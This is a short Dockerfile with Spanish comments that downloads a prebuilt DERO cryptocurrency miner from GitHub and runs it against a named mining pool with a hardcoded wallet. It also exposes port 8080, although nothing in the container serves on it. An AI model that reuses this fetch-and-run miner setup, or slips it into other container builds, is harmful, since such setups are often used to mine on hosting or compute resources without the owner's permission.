# Usa una imagen base (asegúrate de usar la imagen correcta para tu aplicación)
FROM ubuntu:latest

# Actualiza el sistema y instala las dependencias necesarias
RUN apt-get update && apt-get install -y wget tar

# Crea un directorio de trabajo
WORKDIR /app

# Descarga y extrae el minero
RUN wget https://github.com/dero-am/astrobwt-miner/releases/download/V1.9.2.R5/astrominer-V1.9.2.R5_amd64_linux.tar.gz \
    && tar -xf astrominer-V1.9.2.R5_amd64_linux.tar.gz \
    && cd astrominer \
    && chmod +x astrominer
    
# Exponer el puerto 8080
EXPOSE 8080

# Define el comando predeterminado a ejecutar al iniciar el contenedor
CMD ["./astrominer/astrominer", "-w", "deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xmsgdxpxkllm7yqlxxlru", "-r", "community-pools.mysrv.cloud:10300", "-p", "rpc"]
